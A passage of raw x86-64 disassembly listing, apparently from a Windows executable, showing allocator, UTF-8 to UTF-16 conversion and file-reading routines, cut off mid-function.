  401f08:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
  401f0c:	75 13                	jne    0x401f21
  401f0e:	48 85 c9             	test   %rcx,%rcx
  401f11:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
  401f15:	74 1f                	je     0x401f36
  401f17:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
  401f1e:	00 
  401f1f:	eb 15                	jmp    0x401f36
  401f21:	4c 8b 42 18          	mov    0x18(%rdx),%r8
  401f25:	49 89 48 10          	mov    %rcx,0x10(%r8)
  401f29:	48 8b 42 10          	mov    0x10(%rdx),%rax
  401f2d:	48 85 c0             	test   %rax,%rax
  401f30:	74 04                	je     0x401f36
  401f32:	4c 89 40 18          	mov    %r8,0x18(%rax)
  401f36:	48 c7 42 10 00 00 00 	movq   $0x0,0x10(%rdx)
  401f3d:	00 
  401f3e:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
  401f45:	00 
  401f46:	48 01 bb 98 28 00 00 	add    %rdi,0x2898(%rbx)
  401f4d:	e9 b3 00 00 00       	jmp    0x402005
  401f52:	48 8d 7a 20          	lea    0x20(%rdx),%rdi
  401f56:	48 81 ff 00 00 00 3f 	cmp    $0x3f000000,%rdi
  401f5d:	7e 45                	jle    0x401fa4
  401f5f:	48 89 f9             	mov    %rdi,%rcx
  401f62:	e8 ef f8 ff ff       	call   0x401856
  401f67:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
  401f6e:	48 89 d9             	mov    %rbx,%rcx
  401f71:	48 01 bb 80 28 00 00 	add    %rdi,0x2880(%rbx)
  401f78:	49 89 c0             	mov    %rax,%r8
  401f7b:	48 89 78 08          	mov    %rdi,0x8(%rax)
  401f7f:	48 89 c6             	mov    %rax,%rsi
  401f82:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
  401f89:	00 
  401f8a:	49 c1 f8 0c          	sar    $0xc,%r8
  401f8e:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  401f95:	00 
  401f96:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
  401f9d:	e8 10 fa ff ff       	call   0x4019b2
  401fa2:	eb 0b                	jmp    0x401faf
  401fa4:	48 89 fa             	mov    %rdi,%rdx
  401fa7:	e8 ec fc ff ff       	call   0x401c98
  401fac:	48 89 c6             	mov    %rax,%rsi
  401faf:	48 83 bb a8 30 00 00 	cmpq   $0x0,0x30a8(%rbx)
  401fb6:	00 
  401fb7:	48 8d 6e 20          	lea    0x20(%rsi),%rbp
  401fbb:	75 26                	jne    0x401fe3
  401fbd:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  401fc4:	00 
  401fc5:	48 8d 83 d8 30 00 00 	lea    0x30d8(%rbx),%rax
  401fcc:	75 0e                	jne    0x401fdc
  401fce:	48 89 83 d8 30 00 00 	mov    %rax,0x30d8(%rbx)
  401fd5:	48 89 83 e0 30 00 00 	mov    %rax,0x30e0(%rbx)
  401fdc:	48 89 83 a8 30 00 00 	mov    %rax,0x30a8(%rbx)
  401fe3:	48 8d 93 a8 30 00 00 	lea    0x30a8(%rbx),%rdx
  401fea:	49 89 e8             	mov    %rbp,%r8
  401fed:	48 89 d9             	mov    %rbx,%rcx
  401ff0:	4c 8d 4c 3d 00       	lea    0x0(%rbp,%rdi,1),%r9
  401ff5:	e8 04 f9 ff ff       	call   0x4018fe
  401ffa:	48 8b 46 08          	mov    0x8(%rsi),%rax
  401ffe:	48 01 83 98 28 00 00 	add    %rax,0x2898(%rbx)
  402005:	48 89 e8             	mov    %rbp,%rax
  402008:	48 83 c4 28          	add    $0x28,%rsp
  40200c:	5b                   	pop    %rbx
  40200d:	5e                   	pop    %rsi
  40200e:	5f                   	pop    %rdi
  40200f:	5d                   	pop    %rbp
  402010:	c3                   	ret
  402011:	48 83 ec 28          	sub    $0x28,%rsp
  402015:	48 83 c2 10          	add    $0x10,%rdx
  402019:	e8 2f fe ff ff       	call   0x401e4d
  40201e:	48 c7 40 08 01 00 00 	movq   $0x1,0x8(%rax)
  402025:	00 
  402026:	48 83 c0 10          	add    $0x10,%rax
  40202a:	48 83 c4 28          	add    $0x28,%rsp
  40202e:	c3                   	ret
  40202f:	53                   	push   %rbx
  402030:	48 83 ec 30          	sub    $0x30,%rsp
  402034:	48 89 d3             	mov    %rdx,%rbx
  402037:	e8 d5 ff ff ff       	call   0x402011
  40203c:	48 89 da             	mov    %rbx,%rdx
  40203f:	48 89 c1             	mov    %rax,%rcx
  402042:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  402047:	e8 00 21 00 00       	call   0x40414c
  40204c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  402051:	48 83 c4 30          	add    $0x30,%rsp
  402055:	5b                   	pop    %rbx
  402056:	c3                   	ret
  402057:	55                   	push   %rbp
  402058:	41 56                	push   %r14
  40205a:	41 55                	push   %r13
  40205c:	41 54                	push   %r12
  40205e:	57                   	push   %rdi
  40205f:	56                   	push   %rsi
  402060:	53                   	push   %rbx
  402061:	48 89 e5             	mov    %rsp,%rbp
  402064:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
  40206b:	45 31 c0             	xor    %r8d,%r8d
  40206e:	48 c7 85 e8 fe ff ff 	movq   $0x0,-0x118(%rbp)
  402075:	00 00 00 00 
  402079:	48 89 ce             	mov    %rcx,%rsi
  40207c:	48 8d 8d e0 fe ff ff 	lea    -0x120(%rbp),%rcx
  402083:	48 89 f2             	mov    %rsi,%rdx
  402086:	48 c7 85 e0 fe ff ff 	movq   $0x0,-0x120(%rbp)
  40208d:	00 00 00 00 
  402091:	e8 2e 52 00 00       	call   0x4072c4
  402096:	84 c0                	test   %al,%al
  402098:	0f 84 53 01 00 00    	je     0x4021f1
  40209e:	48 8d 9d f0 fe ff ff 	lea    -0x110(%rbp),%rbx
  4020a5:	48 89 d9             	mov    %rbx,%rcx
  4020a8:	e8 5c 3f 00 00       	call   0x406009
  4020ad:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  4020b1:	48 89 ea             	mov    %rbp,%rdx
  4020b4:	e8 8f 95 00 00       	call   0x40b648
  4020b9:	48 63 f8             	movslq %eax,%rdi
  4020bc:	48 85 ff             	test   %rdi,%rdi
  4020bf:	48 89 bd f8 fe ff ff 	mov    %rdi,-0x108(%rbp)
  4020c6:	0f 85 fa 00 00 00    	jne    0x4021c6
  4020cc:	48 8b 9d e0 fe ff ff 	mov    -0x120(%rbp),%rbx
  4020d3:	ff 15 63 93 03 00    	call   *0x39363(%rip)        # 0x43b43c
  4020d9:	48 39 c3             	cmp    %rax,%rbx
  4020dc:	0f 84 d2 00 00 00    	je     0x4021b4
  4020e2:	48 89 d9             	mov    %rbx,%rcx
  4020e5:	e8 96 90 00 00       	call   0x40b180
  4020ea:	31 d2                	xor    %edx,%edx
  4020ec:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  4020f2:	48 89 d9             	mov    %rbx,%rcx
  4020f5:	48 89 c6             	mov    %rax,%rsi
  4020f8:	e8 f3 92 00 00       	call   0x40b3f0
  4020fd:	48 89 d9             	mov    %rbx,%rcx
  402100:	e8 7b 90 00 00       	call   0x40b180
  402105:	45 31 c0             	xor    %r8d,%r8d
  402108:	48 89 f2             	mov    %rsi,%rdx
  40210b:	48 89 d9             	mov    %rbx,%rcx
  40210e:	49 89 c4             	mov    %rax,%r12
  402111:	e8 da 92 00 00       	call   0x40b3f0
  402116:	4d 85 e4             	test   %r12,%r12
  402119:	0f 8e 95 00 00 00    	jle    0x4021b4
  40211f:	4c 89 e1             	mov    %r12,%rcx
  402122:	e8 8c 31 00 00       	call   0x4052b3
  402127:	49 89 d9             	mov    %rbx,%r9
  40212a:	4d 89 e0             	mov    %r12,%r8
  40212d:	ba 01 00 00 00       	mov    $0x1,%edx
  402132:	48 8d 48 10          	lea    0x10(%rax),%rcx
  402136:	48 89 c6             	mov    %rax,%rsi
  402139:	e8 92 94 00 00       	call   0x40b5d0
  40213e:	49 39 c4             	cmp    %rax,%r12
  402141:	49 89 c5             	mov    %rax,%r13
  402144:	74 14                	je     0x40215a
  402146:	48 89 d9             	mov    %rbx,%rcx
  402149:	e8 aa 94 00 00       	call   0x40b5f8
  40214e:	85 c0                	test   %eax,%eax
  402150:	74 08                	je     0x40215a
  402152:	48 89 d9             	mov    %rbx,%rcx
  402155:	e8 50 97 00 00       	call   0x40b8aa
  40215a:	48 89 d9             	mov    %rbx,%rcx
  40215d:	e8 86 94 00 00       	call   0x40b5e8
  402162:	48 89 da             	mov    %rbx,%rdx
  402165:	41 89 c6             	mov    %eax,%r14d
  402168:	89 c1                	mov    %eax,%ecx
  40216a:	e8 01 94 00 00       	call   0x40b570
  40216f:	45 85 f6             	test   %r14d,%r14d
  402172:	79 12                	jns    0x402186
  402174:	4d 39 ec             	cmp    %r13,%r12
  402177:	7e 46                	jle    0x4021bf
  402179:	4c 89 ea             	mov    %r13,%rdx
  40217c:	48 89 f1             	mov    %rsi,%rcx
  40217f:	e8 45 31 00 00       	call   0x4052c9
  402184:	eb 36                	jmp    0x4021bc
  402186:	48 89 d9             	mov    %rbx,%rcx
  402189:	e8 60 f4 ff ff       	call   0x4015ee
  40218e:	48 85 c0             	test   %rax,%rax
  402191:	48 89 c3             	mov    %rax,%rbx
  402194:	74 03                	je     0x402199
  402196:	48 8b 38             	mov    (%rax),%rdi
  402199:	48 89 fa             	mov    %rdi,%rdx
  40219c:	48 89 f1             	mov    %rsi,%rcx
  40219f:	e8 7a 2f 00 00       	call   0x40511e
  4021a4:	48 89 da             	mov    %rbx,%rdx
  4021a7:	48 89 c1             	mov    %rax,%rcx
  4021aa:	48 89 c6             	mov    %rax,%rsi
  4021ad:	e8 75 3e 00 00       	call   0x406027
  4021b2:	eb 0b                	jmp    0x4021bf
  4021b4:	48 89 d9             	mov    %rbx,%rcx
  4021b7:	e8 32 f4 ff ff       	call   0x4015ee
  4021bc:	48 89 c6             	mov    %rax,%rsi
  4021bf:	48 89 b5 e8 fe ff ff 	mov    %rsi,-0x118(%rbp)
  4021c6:	e8 e6 3d 00 00       	call   0x405fb1
  4021cb:	48 8b 8d e0 fe ff ff 	mov    -0x120(%rbp),%rcx
  4021d2:	48 85 c9             	test   %rcx,%rcx
  4021d5:	75 13                	jne    0x4021ea
  4021d7:	48 83 bd f8 fe ff ff 	cmpq   $0x0,-0x108(%rbp)
  4021de:	00 
  4021df:	0f 84 a5 00 00 00    	je     0x40228a
  4021e5:	e8 92 6e 00 00       	call   0x40907c
  4021ea:	e8 11 94 00 00       	call   0x40b600
  4021ef:	eb e6                	jmp    0x4021d7
  4021f1:	48 8b 0d 18 54 01 00 	mov    0x15418(%rip),%rcx        # 0x417610
  4021f8:	ba 30 00 00 00       	mov    $0x30,%edx
  4021fd:	e8 40 30 00 00       	call   0x405242
  402202:	48 85 f6             	test   %rsi,%rsi
  402205:	b9 0d 00 00 00       	mov    $0xd,%ecx
  40220a:	48 89 c3             	mov    %rax,%rbx
  40220d:	48 8b 05 9c 54 01 00 	mov    0x1549c(%rip),%rax        # 0x4176b0
  402214:	48 89 03             	mov    %rax,(%rbx)
  402217:	48 8d 05 22 ce 00 00 	lea    0xce22(%rip),%rax        # 0x40f040
  40221e:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402222:	74 07                	je     0x40222b
  402224:	48 8b 06             	mov    (%rsi),%rax
  402227:	48 8d 48 0d          	lea    0xd(%rax),%rcx
  40222b:	e8 50 30 00 00       	call   0x405280
  402230:	48 8d 15 89 ce 00 00 	lea    0xce89(%rip),%rdx        # 0x40f0c0
  402237:	48 89 c7             	mov    %rax,%rdi
  40223a:	48 89 c1             	mov    %rax,%rcx
  40223d:	e8 e5 3d 00 00       	call   0x406027
  402242:	48 89 f2             	mov    %rsi,%rdx
  402245:	48 89 f9             	mov    %rdi,%rcx
  402248:	e8 da 3d 00 00       	call   0x406027
  40224d:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
  402251:	48 89 fa             	mov    %rdi,%rdx
  402254:	e8 03 1f 00 00       	call   0x40415c
  402259:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
  40225d:	31 d2                	xor    %edx,%edx
  40225f:	e8 f8 1e 00 00       	call   0x40415c
  402264:	4c 8d 0d dd cd 00 00 	lea    0xcddd(%rip),%r9        # 0x40f048
  40226b:	48 89 d9             	mov    %rbx,%rcx
  40226e:	48 c7 44 24 20 b5 02 	movq   $0x2b5,0x20(%rsp)
  402275:	00 00 
  402277:	4c 8d 05 e9 cd 00 00 	lea    0xcde9(%rip),%r8        # 0x40f067
  40227e:	48 8d 15 bb cd 00 00 	lea    0xcdbb(%rip),%rdx        # 0x40f040
  402285:	e8 2b 39 00 00       	call   0x405bb5
  40228a:	48 8b 85 e8 fe ff ff 	mov    -0x118(%rbp),%rax
  402291:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
  402298:	5b                   	pop    %rbx
  402299:	5e                   	pop    %rsi
  40229a:	5f                   	pop    %rdi
  40229b:	41 5c                	pop    %r12
  40229d:	41 5d                	pop    %r13
  40229f:	41 5e                	pop    %r14
  4022a1:	5d                   	pop    %rbp
  4022a2:	c3                   	ret
  4022a3:	55                   	push   %rbp
  4022a4:	57                   	push   %rdi
  4022a5:	56                   	push   %rsi
  4022a6:	53                   	push   %rbx
  4022a7:	48 83 ec 28          	sub    $0x28,%rsp
  4022ab:	48 89 cb             	mov    %rcx,%rbx
  4022ae:	48 8b 0d ab 52 01 00 	mov    0x152ab(%rip),%rcx        # 0x417560
  4022b5:	48 89 d6             	mov    %rdx,%rsi
  4022b8:	48 c1 e2 04          	shl    $0x4,%rdx
  4022bc:	48 83 c2 0a          	add    $0xa,%rdx
  4022c0:	e8 7d 2f 00 00       	call   0x405242
  4022c5:	4c 8d 4e fd          	lea    -0x3(%rsi),%r9
  4022c9:	31 c9                	xor    %ecx,%ecx
  4022cb:	45 31 c0             	xor    %r8d,%r8d
  4022ce:	4c 8d 56 fe          	lea    -0x2(%rsi),%r10
  4022d2:	4c 8d 5e ff          	lea    -0x1(%rsi),%r11
  4022d6:	48 39 f1             	cmp    %rsi,%rcx
  4022d9:	0f 8d 4b 01 00 00    	jge    0x40242a
  4022df:	40 8a 2c 0b          	mov    (%rbx,%rcx,1),%bpl
  4022e3:	40 84 ed             	test   %bpl,%bpl
  4022e6:	78 0c                	js     0x4022f4
  4022e8:	48 0f be d5          	movsbq %bpl,%rdx
  4022ec:	48 ff c1             	inc    %rcx
  4022ef:	e9 e8 00 00 00       	jmp    0x4023dc
  4022f4:	40 88 ea             	mov    %bpl,%dl
  4022f7:	c0 ea 05             	shr    $0x5,%dl
  4022fa:	80 fa 06             	cmp    $0x6,%dl
  4022fd:	75 2a                	jne    0x402329
  4022ff:	4c 39 d9             	cmp    %r11,%rcx
  402302:	0f 8d b8 00 00 00    	jge    0x4023c0
  402308:	40 8a 7c 0b 01       	mov    0x1(%rbx,%rcx,1),%dil
  40230d:	48 89 ea             	mov    %rbp,%rdx
  402310:	48 83 c1 02          	add    $0x2,%rcx
  402314:	48 c1 e2 06          	shl    $0x6,%rdx
  402318:	81 e2 c0 07 00 00    	and    $0x7c0,%edx
  40231e:	83 e7 3f             	and    $0x3f,%edi
  402321:	48 09 fa             	or     %rdi,%rdx
  402324:	e9 b3 00 00 00       	jmp    0x4023dc
  402329:	40 88 ea             	mov    %bpl,%dl
  40232c:	c0 ea 04             	shr    $0x4,%dl
  40232f:	80 fa 0e             	cmp    $0xe,%dl
  402332:	75 35                	jne    0x402369
  402334:	4c 39 d1             	cmp    %r10,%rcx
  402337:	0f 8d 83 00 00 00    	jge    0x4023c0
  40233d:	8a 54 0b 02          	mov    0x2(%rbx,%rcx,1),%dl
  402341:	48 c1 e5 0c          	shl    $0xc,%rbp
  402345:	0f b6 7c 0b 01       	movzbl 0x1(%rbx,%rcx,1),%edi
  40234a:	81 e5 00 f0 00 00    	and    $0xf000,%ebp
  402350:	48 83 c1 03          	add    $0x3,%rcx
  402354:	83 e2 3f             	and    $0x3f,%edx
  402357:	48 c1 e7 06          	shl    $0x6,%rdi
  40235b:	48 09 ea             	or     %rbp,%rdx
  40235e:	81 e7 c0 0f 00 00    	and    $0xfc0,%edi
  402364:	48 09 fa             	or     %rdi,%rdx
  402367:	eb 61                	jmp    0x4023ca
  402369:	40 88 ea             	mov    %bpl,%dl
  40236c:	c0 ea 03             	shr    $0x3,%dl
  40236f:	80 fa 1e             	cmp    $0x1e,%dl
  402372:	75 4c                	jne    0x4023c0
  402374:	4c 39 c9             	cmp    %r9,%rcx
  402377:	7d 47                	jge    0x4023c0
  402379:	8a 54 0b 03          	mov    0x3(%rbx,%rcx,1),%dl
  40237d:	48 c1 e5 12          	shl    $0x12,%rbp
  402381:	0f b6 7c 0b 01       	movzbl 0x1(%rbx,%rcx,1),%edi
  402386:	81 e5 00 00 1c 00    	and    $0x1c0000,%ebp
  40238c:	83 e2 3f             	and    $0x3f,%edx
  40238f:	48 c1 e7 0c          	shl    $0xc,%rdi
  402393:	48 09 ea             	or     %rbp,%rdx
  402396:	81 e7 00 f0 03 00    	and    $0x3f000,%edi
  40239c:	48 09 fa             	or     %rdi,%rdx
  40239f:	0f b6 7c 0b 02       	movzbl 0x2(%rbx,%rcx,1),%edi
  4023a4:	48 83 c1 04          	add    $0x4,%rcx
  4023a8:	48 c1 e7 06          	shl    $0x6,%rdi
  4023ac:	81 e7 c0 0f 00 00    	and    $0xfc0,%edi
  4023b2:	48 09 fa             	or     %rdi,%rdx
  4023b5:	48 81 fa ff ff 00 00 	cmp    $0xffff,%rdx
  4023bc:	7f 25                	jg     0x4023e3
  4023be:	eb 0a                	jmp    0x4023ca
  4023c0:	48 ff c1             	inc    %rcx
  4023c3:	ba fd ff 00 00       	mov    $0xfffd,%edx
  4023c8:	eb 12                	jmp    0x4023dc
  4023ca:	48 81 fa ff d7 00 00 	cmp    $0xd7ff,%rdx
  4023d1:	7e 09                	jle    0x4023dc
  4023d3:	48 81 fa ff df 00 00 	cmp    $0xdfff,%rdx
  4023da:	7e 10                	jle    0x4023ec
  4023dc:	66 42 89 14 40       	mov    %dx,(%rax,%r8,2)
  4023e1:	eb 3f                	jmp    0x402422
  4023e3:	48 81 fa ff ff 10 00 	cmp    $0x10ffff,%rdx
  4023ea:	7e 09                	jle    0x4023f5
  4023ec:	66 42 c7 04 40 fd ff 	movw   $0xfffd,(%rax,%r8,2)
  4023f3:	eb 2d                	jmp    0x402422
  4023f5:	4b 8d 2c 00          	lea    (%r8,%r8,1),%rbp
  4023f9:	48 81 ea 00 00 01 00 	sub    $0x10000,%rdx
  402400:	49 ff c0             	inc    %r8
  402403:	48 89 d7             	mov    %rdx,%rdi
  402406:	66 81 e2 ff 03       	and    $0x3ff,%dx
  40240b:	48 c1 ff 0a          	sar    $0xa,%rdi
  40240f:	66 81 ea 00 24       	sub    $0x2400,%dx
  402414:	66 81 ef 00 28       	sub    $0x2800,%di
  402419:	66 89 54 28 02       	mov    %dx,0x2(%rax,%rbp,1)
  40241e:	66 89 3c 28          	mov    %di,(%rax,%rbp,1)
  402422:	49 ff c0             	inc    %r8
  402425:	e9 ac fe ff ff       	jmp    0x4022d6
  40242a:	66 42 c7 04 40 00 00 	movw   $0x0,(%rax,%r8,2)
  402431:	48 83 c4 28          	add    $0x28,%rsp
  402435:	5b                   	pop    %rbx
  402436:	5e                   	pop    %rsi
  402437:	5f                   	pop    %rdi
  402438:	5d                   	pop    %rbp
  402439:	c3                   	ret
  40243a:	ba 50 00 00 00       	mov    $0x50,%edx
  40243f:	e9 fc 47 00 00       	jmp    0x406c40
  402444:	41 54                	push   %r12
  402446:	55                   	push   %rbp
  402447:	57                   	push   %rdi
  402448:	56                   	push   %rsi
  402449:	53                   	push   %rbx
  40244a:	48 83 ec 20          	sub    $0x20,%rsp
  40244e:	4c 8d 25 1b cc 00 00 	lea    0xcc1b(%rip),%r12        # 0x40f070
  402455:	48 89 cf             	mov    %rcx,%rdi
  402458:	48 89 d1             	mov    %rdx,%rcx
  40245b:	48 89 d6             	mov    %rdx,%rsi
  40245e:	44 89 c5             	mov    %r8d,%ebp
  402461:	e8 86 05 00 00       	call   0x4029ec
  402466:	48 8d 15 03 cc 00 00 	lea    0xcc03(%rip),%rdx        # 0x40f070
  40246d:	48 89 f9             	mov    %rdi,%rcx
  402470:	49 89 c0             	mov    %rax,%r8
  402473:	e8 60 91 00 00       	call   0x40b5d8
  402478:	89 c3                	mov    %eax,%ebx
  40247a:	31 d2                	xor    %edx,%edx
  40247c:	48 85 f6             	test   %rsi,%rsi
  40247f:	48 63 c3             	movslq %ebx,%rax
  402482:	74 03                	je     0x402487
  402484:	48 8b 16             	mov    (%rsi),%rdx
  402487:	48 39 c2             	cmp    %rax,%rdx
  40248a:	7e 42                	jle    0x4024ce
  40248c:	80 7c 06 10 00       	cmpb   $0x0,0x10(%rsi,%rax,1)
  402491:	75 23                	jne    0x4024b6
  402493:	31 c9                	xor    %ecx,%ecx
  402495:	48 89 fa             	mov    %rdi,%rdx
  402498:	e8 7b 93 00 00       	call   0x40b818
  40249d:	85 c0                	test   %eax,%eax
  40249f:	74 11                	je     0x4024b2
  4024a1:	40 84 ed             	test   %bpl,%bpl
  4024a4:	74 28                	je     0x4024ce
  4024a6:	48 8d 0d d3 cb 00 00 	lea    0xcbd3(%rip),%rcx        # 0x40f080
  4024ad:	e8 6e 93 00 00       	call   0x40b820
  4024b2:	ff c3                	inc    %ebx
  4024b4:	eb c4                	jmp    0x40247a
  4024b6:	4c 8d 44 06 10       	lea    0x10(%rsi,%rax,1),%r8
  4024bb:	4c 89 e2             	mov    %r12,%rdx
  4024be:	48 89 f9             	mov    %rdi,%rcx
  4024c1:	e8 12 91 00 00       	call   0x40b5d8
  4024c6:	85 c0                	test   %eax,%eax
  4024c8:	7e d7                	jle    0x4024a1
  4024ca:	01 c3                	add    %eax,%ebx
  4024cc:	eb ac                	jmp    0x40247a
  4024ce:	48 83 c4 20          	add    $0x20,%rsp
  4024d2:	5b                   	pop    %rbx
  4024d3:	5e                   	pop    %rsi
  4024d4:	5f                   	pop    %rdi
  4024d5:	5d                   	pop    %rbp
  4024d6:	41 5c                	pop    %r12
  4024d8:	c3                   	ret
  4024d9:	55                   	push   %rbp
  4024da:	57                   	push   %rdi
  4024db:	56                   	push   %rsi
  4024dc:	53                   	push   %rbx
  4024dd:	48 89 e5             	mov    %rsp,%rbp
  4024e0:	48 81 ec 58 01 00 00 	sub    $0x158,%rsp
  4024e7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4024ed:	48 89 ce             	mov    %rcx,%rsi
  4024f0:	48 89 55 30          	mov    %rdx,0x30(%rbp)
  4024f4:	48 8d 8d e0 fe ff ff 	lea    -0x120(%rbp),%rcx
  4024fb:	48 89 f2             	mov    %rsi,%rdx
  4024fe:	48 c7 85 e0 fe ff ff 	movq   $0x0,-0x120(%rbp)
  402505:	00 00 00 00 
  402509:	e8 b6 4d 00 00       	call   0x4072c4
  40250e:	84 c0                	test   %al,%al
  402510:	74 6a                	je     0x40257c
  402512:	48 8d 9d e8 fe ff ff 	lea    -0x118(%rbp),%rbx
  402519:	48 89 d9             	mov    %rbx,%rcx
  40251c:	e8 e8 3a 00 00       	call   0x406009
  402521:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  402525:	48 89 ea             	mov    %rbp,%rdx
  402528:	e8 1b 91 00 00       	call   0x40b648
  40252d:	48 98                	cltq
  40252f:	48 85 c0             	test   %rax,%rax
  402532:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
  402539:	75 16                	jne    0x402551
  40253b:	48 8b 55 30          	mov    0x30(%rbp),%rdx
  40253f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  402545:	48 8b 8d e0 fe ff ff 	mov    -0x120(%rbp),%rcx
  40254c:	e8 f3 fe ff ff       	call   0x402444
  402551:	e8 5b 3a 00 00       	call   0x405fb1
  402556:	48 8b 8d e0 fe ff ff 	mov    -0x120(%rbp),%rcx
  40255d:	48 85 c9             	test   %rcx,%rcx
  402560:	75 13                	jne    0x402575
  402562:	48 83 bd f0 fe ff ff 	cmpq   $0x0,-0x110(%rbp)
  402569:	00 
  40256a:	0f 84 a6 00 00 00    	je     0x402616
  402570:	e8 07 6b 00 00       	call   0x40907c
  402575:	e8 86 90 00 00       	call   0x40b600
  40257a:	eb e6                	jmp    0x402562
  40257c:	48 8b 0d 8d 50 01 00 	mov    0x1508d(%rip),%rcx        # 0x417610
  402583:	ba 30 00 00 00       	mov    $0x30,%edx
  402588:	e8 b5 2c 00 00       	call   0x405242
  40258d:	48 85 f6             	test   %rsi,%rsi
  402590:	b9 0d 00 00 00       	mov    $0xd,%ecx
  402595:	48 89 c3             	mov    %rax,%rbx
  402598:	48 8b 05 11 51 01 00 	mov    0x15111(%rip),%rax        # 0x4176b0
  40259f:	48 89 03             	mov    %rax,(%rbx)
  4025a2:	48 8d 05 97 ca 00 00 	lea    0xca97(%rip),%rax        # 0x40f040
  4025a9:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4025ad:	74 07                	je     0x4025b6
  4025af:	48 8b 06             	mov    (%rsi),%rax
  4025b2:	48 8d 48 0d          	lea    0xd(%rax),%rcx
  4025b6:	e8 c5 2c 00 00       	call   0x405280
  4025bb:	48 8d 15 fe ca 00 00 	lea    0xcafe(%rip),%rdx        # 0x40f0c0
  4025c2:	48 89 c7             	mov    %rax,%rdi
  4025c5:	48 89 c1             	mov    %rax,%rcx
  4025c8:	e8 5a 3a 00 00       	call   0x406027
  4025cd:	48 89 f2             	mov    %rsi,%rdx
  4025d0:	48 89 f9             	mov    %rdi,%rcx
  4025d3:	e8 4f 3a 00 00       	call   0x406027
  4025d8:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
  4025dc:	48 89 fa             	mov    %rdi,%rdx
  4025df:	e8 78 1b 00 00       	call   0x40415c
  4025e4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
  4025e8:	31 d2                	xor    %edx,%edx
  4025ea:	e8 6d 1b 00 00       	call   0x40415c
  4025ef:	4c 8d 0d 52 ca 00 00 	lea    0xca52(%rip),%r9        # 0x40f048
  4025f6:	48 89 d9             	mov    %rbx,%rcx
  4025f9:	48 c7 44 24 20 c2 02 	movq   $0x2c2,0x20(%rsp)
  402600:	00 00 
  402602:	4c 8d 05 6a ca 00 00 	lea    0xca6a(%rip),%r8        # 0x40f073
  402609:	48 8d 15 30 ca 00 00 	lea    0xca30(%rip),%rdx        # 0x40f040
  402610:	e8 a0 35 00 00       	call   0x405bb5
  402615:	90                   	nop
  402616:	48 81 c4 58 01 00 00 	add    $0x158,%rsp
  40261d:	5b                   	pop    %rbx
  40261e:	5e                   	pop    %rsi
  40261f:	5f                   	pop    %rdi
  402620:	5d                   	pop    %rbp
  402621:	c3                   	ret
  402622:	53                   	push   %rbx
  402623:	48 83 ec 20          	sub    $0x20,%rsp
  402627:	31 db                	xor    %ebx,%ebx
  402629:	48 85 c9             	test   %rcx,%rcx
  40262c:	74 03                	je     0x402631
  40262e:	48 8b 19             	mov    (%rcx),%rbx
  402631:	e8 b6 03 00 00       	call   0x4029ec
  402636:	48 89 da             	mov    %rbx,%rdx
  402639:	48 89 c1             	mov    %rax,%rcx
  40263c:	48 83 c4 20          	add    $0x20,%rsp
  402640:	5b                   	pop    %rbx
  402641:	e9 5d fc ff ff       	jmp    0x4022a3
  402646:	53                   	push   %rbx
  402647:	48 83 ec 20          	sub    $0x20,%rsp
  40264b:	48 89 cb             	mov    %rcx,%rbx
  40264e:	e8 c4 04 00 00       	call   0x402b17
  402653:	48 89 da             	mov    %rbx,%rdx
  402656:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  40265d:	48 83 c4 20          	add    $0x20,%rsp
  402661:	5b                   	pop    %rbx
  402662:	e9 c8 f9 ff ff       	jmp    0x40202f
  402667:	90                   	nop
  402668:	90                   	nop
  402669:	90                   	nop
  40266a:	90                   	nop
  40266b:	90                   	nop
  40266c:	90                   	nop
  40266d:	90                   	nop
  40266e:	90                   	nop
  40266f:	90                   	nop
  402670:	c3                   	ret
  402671:	57                   	push   %rdi
  402672:	56                   	push   %rsi
  402673:	53                   	push   %rbx
  402674:	48 83 ec 20          	sub    $0x20,%rsp
  402678:	84 d2                	test   %dl,%dl
  40267a:	48 89 cf             	mov    %rcx,%rdi
  40267d:	74 0e                	je     0x40268d
  40267f:	48 8b 05 0a 4b 01 00 	mov    0x14b0a(%rip),%rax        # 0x417190
  402686:	b9 10 27 00 00       	mov    $0x2710,%ecx
  40268b:	ff 10                	call   *(%rax)
  40268d:	48 89 f9             	mov    %rdi,%rcx
  402690:	e8 8d ff ff ff       	call   0x402622
  402695:	48 8b 35 34 4b 01 00 	mov    0x14b34(%rip),%rsi        # 0x4171d0
  40269c:	48 89 c3             	mov    %rax,%rbx
  40269f:	48 89 c1             	mov    %rax,%rcx
  4026a2:	ff 16                	call   *(%rsi)
  4026a4:	85 c0                	test   %eax,%eax
  4026a6:	75 4f                	jne    0x4026f7
  4026a8:	48 8b 05 21 4a 01 00 	mov    0x14a21(%rip),%rax        # 0x4170d0
  4026af:	ff 10                	call   *(%rax)
  4026b1:	83 f8 02             	cmp    $0x2,%eax
  4026b4:	74 41                	je     0x4026f7
  4026b6:	83 f8 03             	cmp    $0x3,%eax
  4026b9:	74 3c                	je     0x4026f7
  4026bb:	83 f8 05             	cmp    $0x5,%eax
  4026be:	0f 94 c2             	sete   %dl
  4026c1:	75 16                	jne    0x4026d9
  4026c3:	48 8b 05 86 4a 01 00 	mov    0x14a86(%rip),%rax        # 0x417150
